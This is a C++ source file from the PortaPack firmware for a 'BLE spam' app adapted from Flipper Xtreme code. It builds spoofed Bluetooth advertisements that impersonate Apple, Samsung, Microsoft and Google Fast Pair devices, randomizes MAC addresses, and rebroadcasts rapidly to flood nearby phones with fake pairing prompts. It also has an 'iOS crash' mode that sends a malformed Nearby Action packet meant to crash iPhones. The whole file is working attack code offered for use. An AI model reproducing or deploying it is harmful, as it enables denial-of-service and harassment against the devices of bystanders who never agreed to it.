/*
 * Copyright (C) 2014 Jared Boone, ShareBrained Technology, Inc.
 * Copyright (C) 2017 Furrtek
 *
 * This file is part of PortaPack.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; see the file COPYING.  If not, write to
 * the Free Software Foundation, Inc., 51 Franklin Street,
 * Boston, MA 02110-1301, USA.
 */

// Code from https://github.com/Flipper-XFW/Xtreme-Apps/tree/04c3a60093e2c2378e79498b4505aa8072980a42/ble_spam/protocols
// Thanks for the work of the original creators!

#include "ui_blespam.hpp"
#include "ui_modemsetup.hpp"

#include "modems.hpp"
#include "audio.hpp"
#include "rtc_time.hpp"
#include "baseband_api.hpp"
#include "string_format.hpp"
#include "portapack_persistent_memory.hpp"

using namespace portapack;
using namespace modems;
using namespace ui;

namespace ui::external_app::blespam {

void BLESpamView::focus() {
    button_startstop.focus();
}

uint64_t BLESpamView::get_freq_by_channel_number(uint8_t channel_number) {
    uint64_t freq_hz;

    switch (channel_number) {
        case 37:
            freq_hz = 2'402'000'000ull;
            break;
        case 38:
            freq_hz = 2'426'000'000ull;
            break;
        case 39:
            freq_hz = 2'480'000'000ull;
            break;
        case 0 ... 10:
            freq_hz = 2'404'000'000ull + channel_number * 2'000'000ull;
            break;
        case 11 ... 36:
            freq_hz = 2'428'000'000ull + (channel_number - 11) * 2'000'000ull;
            break;
        default:
            freq_hz = UINT64_MAX;
    }

    return freq_hz;
}
BLESpamView::BLESpamView(NavigationView& nav)
    : nav_{nav} {
    add_children({&button_startstop,
                  &field_frequency,
                  &tx_view,
                  &chk_randdev,
                  &options_atkmode,
                  &console});

    button_startstop.on_select = [this](Button&) {
        if (is_running) {
            is_running = false;
            stop();
            button_startstop.set_text("Start");
        } else {
            is_running = true;
            start();
            button_startstop.set_text("Stop");
        }
    };
    chk_randdev.set_value(true);
    field_frequency.set_value(get_freq_by_channel_number(channel_number));
    chk_randdev.on_select = [this](Checkbox&, bool v) {
        randomDev = v;
    };
    options_atkmode.on_change = [this](size_t, int32_t i) {
        attackType = (ATK_TYPE)i;
        changePacket(true);
    };
    console.writeln("Based on work of:");
    console.writeln("@Willy-JL, @ECTO-1A,");
    console.writeln("@Spooks4576, @iNetro");

    changePacket(true);  // init
}

void BLESpamView::stop() {
    transmitter_model.disable();
    baseband::shutdown();
}

void BLESpamView::start() {
    baseband::run_image(portapack::spi_flash::image_tag_btle_tx);
    transmitter_model.enable();

    baseband::set_btletx(channel_number, mac, advertisementData, pduType);
}
void BLESpamView::reset() {
    stop();
    start();
}

void BLESpamView::randomChn() {
    channel_number = 37 + std::rand() % (39 - 37 + 1);
    field_frequency.set_value(get_freq_by_channel_number(channel_number));
}

void BLESpamView::randomizeMac() {
    if (!randomMac) return;
    const char hexDigits[] = "0123456789ABCDEF";
    // Generate 12 random hexadecimal characters
    for (int i = 0; i < 12; ++i) {
        int randomIndex = rand() % 16;
        mac[i] = hexDigits[randomIndex];
    }
    mac[12] = '\0';  // Null-terminate the string
}

void BLESpamView::furi_hal_random_fill_buf(uint8_t* buf, uint32_t len) {
    for (uint32_t i = 0; i < len; i += 4) {
        const uint32_t random_val = rand();
        uint8_t len_cur = ((i + 4) < len) ? (4) : (len - i);
        memcpy(&buf[i], &random_val, len_cur);
    }
}

void BLESpamView::createSamsungPacket() {
    EasysetupCfg* cfg = NULL;
    uint8_t packet_SamsungSizes[] = {0, 31, 15};
    EasysetupType type;
    if (cfg && cfg->type != 0x00) {
        type = cfg->type;
    } else {
        const EasysetupType types[] = {
            EasysetupTypeBuds,
            EasysetupTypeWatch,
        };
        type = types[rand() % COUNT_OF(types)];
    }

    uint8_t size = packet_SamsungSizes[type];
    uint8_t* packet = (uint8_t*)malloc(size);
    uint8_t i = 0;

    switch (type) {
        case EasysetupTypeBuds: {
            uint32_t model;
            switch (PayloadModeRandom) {
                case PayloadModeRandom:
                default:
                    model = buds_models[rand() % buds_models_count].value;
                    break;
                case PayloadModeValue:
                    model = cfg->data.buds.model;
                    break;
            }

            packet[i++] = 27;    // Size
            packet[i++] = 0xFF;  // AD Type (Manufacturer Specific)
            packet[i++] = 0x75;  // Company ID (Samsung Electronics Co. Ltd.)
            packet[i++] = 0x00;  // ...
            packet[i++] = 0x42;
            packet[i++] = 0x09;
            packet[i++] = 0x81;
            packet[i++] = 0x02;
            packet[i++] = 0x14;
            packet[i++] = 0x15;
            packet[i++] = 0x03;
            packet[i++] = 0x21;
            packet[i++] = 0x01;
            packet[i++] = 0x09;
            packet[i++] = (model >> 0x10) & 0xFF;  // Buds Model / Color (?)
            packet[i++] = (model >> 0x08) & 0xFF;  // ...
            packet[i++] = 0x01;                    // ... (Always static?)
            packet[i++] = (model >> 0x00) & 0xFF;  // ...
            packet[i++] = 0x06;
            packet[i++] = 0x3C;
            packet[i++] = 0x94;
            packet[i++] = 0x8E;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0xC7;
            packet[i++] = 0x00;

            packet[i++] = 16;    // Size
            packet[i++] = 0xFF;  // AD Type (Manufacturer Specific)
            packet[i++] = 0x75;  // Company ID (Samsung Electronics Co. Ltd.)
            // Truncated AD segment, Android seems to fill in the rest with zeros
            break;
        }
        case EasysetupTypeWatch: {
            uint8_t model;
            switch (PayloadModeRandom) {
                case PayloadModeRandom:
                default:
                    model = watch_models[rand() % watch_models_count].value;
                    break;
                case PayloadModeValue:
                    model = cfg->data.watch.model;
                    break;
            }

            packet[i++] = 14;    // Size
            packet[i++] = 0xFF;  // AD Type (Manufacturer Specific)
            packet[i++] = 0x75;  // Company ID (Samsung Electronics Co. Ltd.)
            packet[i++] = 0x00;  // ...
            packet[i++] = 0x01;
            packet[i++] = 0x00;
            packet[i++] = 0x02;
            packet[i++] = 0x00;
            packet[i++] = 0x01;
            packet[i++] = 0x01;
            packet[i++] = 0xFF;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x43;
            packet[i++] = (model >> 0x00) & 0xFF;  // Watch Model / Color (?)
            break;
        }
        default:
            break;
    }
    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
    free(packet);
}

void BLESpamView::createWindowsPacket() {
    /*  const char* names[] = {
          "PortaPack",
          "HackRf",
          "iOS 21 🍎",
          "WorkMate",
          "👉👌",
          "🔵🦷",
      }; //not worky using fix, for testing.
      */
    const char* name = "PortaPack";
    // name = names[rand() % 6];
    uint8_t name_len = strlen(name);

    uint8_t size = 7 + name_len;
    uint8_t* packet = (uint8_t*)malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1;              // Size
    packet[i++] = 0xFF;                  // AD Type (Manufacturer Specific)
    packet[i++] = 0x06;                  // Company ID (Microsoft)
    packet[i++] = 0x00;                  // ...
    packet[i++] = 0x03;                  // Microsoft Beacon ID
    packet[i++] = 0x00;                  // Microsoft Beacon Sub Scenario
    packet[i++] = 0x80;                  // Reserved RSSI Byte
    memcpy(&packet[i], name, name_len);  // Device Name
    i += name_len;
    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
    free(packet);
}

void BLESpamView::createIosPacket(bool crash = false) {
    uint8_t ios_packet_sizes[18] = {0, 0, 0, 0, 0, 24, 0, 31, 0, 12, 0, 0, 20, 0, 12, 11, 11, 17};
    ContinuityType type;
    const ContinuityType types[] = {
        ContinuityTypeProximityPair,
        ContinuityTypeNearbyAction,
    };
    type = types[rand() % COUNT_OF(types)];
    if (crash) type = ContinuityTypeCustomCrash;

    uint8_t size = ios_packet_sizes[type];
    uint8_t* packet = (uint8_t*)malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1;    // Size
    packet[i++] = 0xFF;        // AD Type (Manufacturer Specific)
    packet[i++] = 0x4C;        // Company ID (Apple, Inc.)
    packet[i++] = 0x00;        // ...
    packet[i++] = type;        // Continuity Type
    packet[i] = size - i - 1;  // Continuity Size
    i++;

    switch (type) {
        case ContinuityTypeAirDrop: {
            packet[i++] = 0x00;            // Zeros
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x00;            // ...
            packet[i++] = 0x01;            // Version
            packet[i++] = (rand() % 256);  // AppleID
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // Phone Number
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // Email
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // Email2
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = 0x00;            // Zero
            break;
        }

        case ContinuityTypeProximityPair: {
            uint16_t model;
            uint8_t color;
            switch (PayloadModeRandom) {
                case PayloadModeRandom:
                default: {
                    uint8_t model_index = rand() % pp_models_count;
                    uint8_t color_index = rand() % pp_models[model_index].colors_count;
                    model = pp_models[model_index].value;
                    color = pp_models[model_index].colors[color_index].value;
                    break;
                }
                    /* case PayloadModeValue:
                         model = cfg->data.proximity_pair.model;
                         color = cfg->data.proximity_pair.color;
                         break;*/
            }

            uint8_t prefix;
            if (model == 0x0055 || model == 0x0030)
                prefix = 0x05;
            else
                prefix = 0x01;

            packet[i++] = prefix;                                // Prefix (paired 0x01 new 0x07 airtag 0x05)
            packet[i++] = (model >> 0x08) & 0xFF;                // Device Model
            packet[i++] = (model >> 0x00) & 0xFF;                // ...
            packet[i++] = 0x55;                                  // Status
            packet[i++] = ((rand() % 10) << 4) + (rand() % 10);  // Buds Battery Level
            packet[i++] = ((rand() % 8) << 4) + (rand() % 10);   // Charing Status and Battery Case Level
            packet[i++] = (rand() % 256);                        // Lid Open Counter
            packet[i++] = color;                                 // Device Color
            packet[i++] = 0x00;
            furi_hal_random_fill_buf(&packet[i], 16);  // Encrypted Payload
            i += 16;
            break;
        }

        case ContinuityTypeAirplayTarget: {
            packet[i++] = (rand() % 256);  // Flags
            packet[i++] = (rand() % 256);  // Configuration Seed
            packet[i++] = (rand() % 256);  // IPv4 Address
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            break;
        }

        case ContinuityTypeHandoff: {
            packet[i++] = 0x01;            // Version
            packet[i++] = (rand() % 256);  // Initialization Vector
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // AES-GCM Auth Tag
            packet[i++] = (rand() % 256);  // Encrypted Payload
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            packet[i++] = (rand() % 256);  // ...
            break;
        }

        case ContinuityTypeTetheringSource: {
            packet[i++] = 0x01;            // Version
            packet[i++] = (rand() % 256);  // Flags
            packet[i++] = (rand() % 101);  // Battery Life
            packet[i++] = 0x00;            // Cell Service Type
            packet[i++] = (rand() % 8);    // ...
            packet[i++] = (rand() % 5);    // Cell Service Strength
            break;
        }

        case ContinuityTypeNearbyAction: {
            uint8_t action;
            switch (PayloadModeRandom) {
                case PayloadModeRandom:
                default:
                    action = na_actions[rand() % na_actions_count].value;
                    break;
                    /* case PayloadModeValue:
                         action = cfg->data.nearby_action.action;
                         break;*/
            }

            uint8_t flags;

            flags = 0xC0;
            if (action == 0x20 && rand() % 2) flags--;       // More spam for 'Join This AppleTV?'
            if (action == 0x09 && rand() % 2) flags = 0x40;  // Glitched 'Setup New Device'

            packet[i++] = flags;                      // Action Flags
            packet[i++] = action;                     // Action Type
            furi_hal_random_fill_buf(&packet[i], 3);  // Authentication Tag
            i += 3;
            break;
        }

        case ContinuityTypeNearbyInfo: {
            packet[i++] = ((rand() % 16) << 4) + (rand() % 16);  // Status Flags and Action Code
            packet[i++] = (rand() % 256);                        // Status Flags
            packet[i++] = (rand() % 256);                        // Authentication Tag
            packet[i++] = (rand() % 256);                        // ...
            packet[i++] = (rand() % 256);                        // ...
            break;
        }

        case ContinuityTypeCustomCrash: {
            // Found by @ECTO-1A

            uint8_t action = na_actions[rand() % na_actions_count].value;
            uint8_t flags = 0xC0;
            if (action == 0x20 && rand() % 2) flags--;       // More spam for 'Join This AppleTV?'
            if (action == 0x09 && rand() % 2) flags = 0x40;  // Glitched 'Setup New Device'

            i -= 2;                                    // Override segment header
            packet[i++] = ContinuityTypeNearbyAction;  // Continuity Type
            packet[i++] = 5;                           // Continuity Size
            packet[i++] = flags;                       // Action Flags
            packet[i++] = action;                      // Action Type
            furi_hal_random_fill_buf(&packet[i], 3);   // Authentication Tag
            i += 3;

            packet[i++] = 0x00;  // Additional Action Data Terminator (?)
            packet[i++] = 0x00;  // ...

            packet[i++] = ContinuityTypeNearbyInfo;   // Continuity Type (?)
            furi_hal_random_fill_buf(&packet[i], 3);  // Continuity Size (?) + Shenanigans (???)
            i += 3;
            break;
        }

        default:
            break;
    }
    // size, packet
    std::string res = to_string_hex_array(packet, size);
    memset(advertisementData, 0, sizeof(advertisementData));
    std::copy(res.begin(), res.end(), advertisementData);
    free(packet);
}

void BLESpamView::createFastPairPacket() {
    uint32_t model;
    model = fastpairModels[rand() % fastpairModels_count].value;
    memset(advertisementData, 0, sizeof(advertisementData));
    // 0         0     6
    const char* source = "03032CFE06162CFED5A59E020AB4\0";
    memcpy(advertisementData, source, 28);
    advertisementData[16] = uint_to_char((model >> 20) & 0x0F, 16);
    advertisementData[17] = uint_to_char((model >> 16) & 0x0F, 16);
    advertisementData[18] = uint_to_char((model >> 12) & 0x0F, 16);
    advertisementData[19] = uint_to_char((model >> 8) & 0x0F, 16);
    advertisementData[20] = uint_to_char((model >> 4) & 0x0F, 16);
    advertisementData[21] = uint_to_char((model >> 0) & 0x0F, 16);
}

void BLESpamView::changePacket(bool forced = false) {
    counter++;  // need to send it multiple times to be accepted
    if (counter >= 3 || forced) {
        // really change packet and mac.
        counter = 0;
        randomizeMac();
        randomChn();
        if (randomDev || forced) {
            switch (attackType) {
                case ATK_IOS_CRASH:
                    createIosPacket(true);
                    break;
                case ATK_IOS:
                    createIosPacket(false);
                    break;
                case ATK_SAMSUNG:
                    createSamsungPacket();
                    break;
                case ATK_WINDOWS:
                    createWindowsPacket();
                    break;
                default:
                case ATK_ANDROID:
                    createFastPairPacket();
                    break;
            }
        }
        // rate limit console display
        displayCounter++;
        if (displayCounter > 5) {
            displayCounter = 0;
            console.writeln(advertisementData);
        }
    }
}
// called each 1/60th of second, so 6 = 100ms
void BLESpamView::on_timer() {
    if (is_running) {
        changePacket();
        reset();
    }
}

BLESpamView::~BLESpamView() {
    stop();
}

const BLESpamView::ContinuityColor BLESpamView::colors_white[] = {
    {0x00},  //, "White"
};
const BLESpamView::ContinuityColor BLESpamView::colors_airpods_max[] = {
    {0x00},  //, "White"
    {0x02},  //, "Red"
    {0x03},  //, "Blue"
    {0x0F},  //, "Black"
    {0x11},  //, "Light Green"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_flex[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_solo_3[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x6},   //, "Gray"
    {0x7},   //, "Gold/White"
    {0x8},   //, "Rose Gold"
    {0x09},  //, "Black"
    {0xE},   //, "Violet/White"
    {0xF},   //, "Bright Red"
    {0x12},  //, "Dark Red"
    {0x13},  //, "Swamp Green"
    {0x14},  //, "Dark Gray"
    {0x15},  //, "Dark Blue"
    {0x1D},  //, "Rose Gold 2"
    {0x20},  //, "Blue/Green"
    {0x21},  //, "Purple/Orange"
    {0x22},  //, "Deep Blue/ Light blue"
    {0x23},  //, "Magenta/Light Fuchsia"
    {0x25},  //, "Black/Red"
    {0x2A},  //, "Gray / Disney LTD"
    {0x2E},  //, "Pinkish white"
    {0x3D},  //, "Red/Blue"
    {0x3E},  //, "Yellow/Blue"
    {0x3F},  //, "White/Red"
    {0x40},  //, "Purple/White"
    {0x5B},  //, "Gold"
    {0x5C},  //, "Silver"
};
const BLESpamView::ContinuityColor BLESpamView::colors_powerbeats_3[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x0B},  //, "Gray/Blue"
    {0x0C},  //, "Gray/Red"
    {0x0D},  //, "Gray/Green"
    {0x12},  //, "Red"
    {0x13},  //, "Swamp Green"
    {0x14},  //, "Gray"
    {0x15},  //, "Deep Blue"
    {0x17},  //, "Dark with Gold Logo"
};
const BLESpamView::ContinuityColor BLESpamView::colors_powerbeats_pro[] = {
    {0x00},  //, "White"
    {0x02},  //, "Yellowish Green"
    {0x03},  //, "Blue"
    {0x04},  //, "Black"
    {0x05},  //, "Pink"
    {0x06},  //, "Red"
    {0x0B},  //, "Gray ?"
    {0x0D},  //, " Sky Blue
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_solo_pro[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_studio_buds[] = {
    {0x00},  //, "White"
    {0x0},   // 1, "Black"
    {0x02},  //, "Red"
    {0x03},  //, "Blue"
    {0x04},  //, "Pink"
    {0x06},  //, "Silver"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_x[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x02},  //, "Blue"
    {0x05},  //, "Gray"
    {0x1D},  //, "Pink"
    {0x25},  //, "Dark/Red"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_studio_3[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x02},  //, "Red"
    {0x03},  //, "Blue"
    {0x18},  //, "Shadow Gray"
    {0x19},  //, "Desert Sand"
    {0x25},  //, "Black / Red"
    {0x26},  //, "Midnight Black"
    {0x27},  //, "Desert Sand 2"
    {0x28},  //, "Gray"
    {0x29},  //, "Clear blue/ gold"
    {0x42},  //, "Green Forest camo"
    {0x43},  //, "White Camo"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_studio_pro[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_fit_pro[] = {
    {0x00},  //, "White"
    {0x01},  //, "Black"
    {0x02},  //, "Pink"
    {0x03},  //, "Grey/White"
    {0x04},  //, "Full Pink"
    {0x05},  //, "Neon Green"
    {0x06},  //, "Night Blue"
    {0x07},  //, "Light Pink"
    {0x08},  //, "Brown"
    {0x09},  //, "Dark Brown"
};
const BLESpamView::ContinuityColor BLESpamView::colors_beats_studio_buds_[] = {
    {0x00},  //, "Black"
    {0x01},  //, "White"
    {0x02},  //, "Transparent"
    {0x03},  //, "Silver"
    {0x04},  //, "Pink"
};

const BLESpamView::contiModels BLESpamView::pp_models[] = {
    {0x0E20, colors_white, COUNT_OF(colors_white)},                            //"AirPods Pro",
    {0x0A20, colors_airpods_max, COUNT_OF(colors_airpods_max)},                //"AirPods Max",
    {0x0055, colors_white, COUNT_OF(colors_white)},                            //"Airtag",
    {0x0030, colors_white, COUNT_OF(colors_white)},                            //"Hermes Airtag",
    {0x0220, colors_white, COUNT_OF(colors_white)},                            //"AirPods",
    {0x0F20, colors_white, COUNT_OF(colors_white)},                            //"AirPods 2nd Gen",
    {0x1320, colors_white, COUNT_OF(colors_white)},                            //"AirPods 3rd Gen",
    {0x1420, colors_white, COUNT_OF(colors_white)},                            //"AirPods Pro 2nd Gen",
    {0x1020, colors_beats_flex, COUNT_OF(colors_beats_flex)},                  // "Beats Flex",
    {0x0620, colors_beats_solo_3, COUNT_OF(colors_beats_solo_3)},              // "Beats Solo 3",
    {0x0320, colors_powerbeats_3, COUNT_OF(colors_powerbeats_3)},              //"Powerbeats 3",
    {0x0B20, colors_powerbeats_pro, COUNT_OF(colors_powerbeats_pro)},          //"Powerbeats Pro",
    {0x0C20, colors_beats_solo_pro, COUNT_OF(colors_beats_solo_pro)},          //"Beats Solo Pro",
    {0x1120, colors_beats_studio_buds, COUNT_OF(colors_beats_studio_buds)},    //"Beats Studio Buds",
    {0x0520, colors_beats_x, COUNT_OF(colors_beats_x)},                        //"Beats X",
    {0x0920, colors_beats_studio_3, COUNT_OF(colors_beats_studio_3)},          //"Beats Studio 3",
    {0x1720, colors_beats_studio_pro, COUNT_OF(colors_beats_studio_pro)},      //"Beats Studio Pro",
    {0x1220, colors_beats_fit_pro, COUNT_OF(colors_beats_fit_pro)},            //"Beats Fit Pro",
    {0x1620, colors_beats_studio_buds_, COUNT_OF(colors_beats_studio_buds_)},  //"Beats Studio Buds+",
};
const uint8_t BLESpamView::pp_models_count = COUNT_OF(pp_models);

const BLESpamView::contiU8 BLESpamView::pp_prefixes[] = {
    {0x07},  //, "New Device"
    {0x01},  //, "Not Your Device"
    {0x05},  //, "New Airtag"
};

const uint8_t BLESpamView::pp_prefixes_count = COUNT_OF(pp_prefixes);

const BLESpamView::contiU8 BLESpamView::na_actions[] = {
    {0x13},  //, "AppleTV AutoFill"
    {0x27},  //, "AppleTV Connecting..."
    {0x20},  //, "Join This AppleTV?"
    {0x19},  //, "AppleTV Audio Sync"
    {0x1E},  //, "AppleTV Color Balance"
    {0x09},  //, "Setup New iPhone"
    {0x02},  //, "Transfer Phone Number"
    {0x0B},  //, "HomePod Setup"
    {0x01},  //, "Setup New AppleTV"
    {0x06},  //, "Pair AppleTV"
    {0x0D},  //, "HomeKit AppleTV Setup"
    {0x2B},  //, "AppleID for AppleTV?"
};

const uint8_t BLESpamView::na_actions_count = COUNT_OF(na_actions);

}  // namespace ui::external_app::blespam
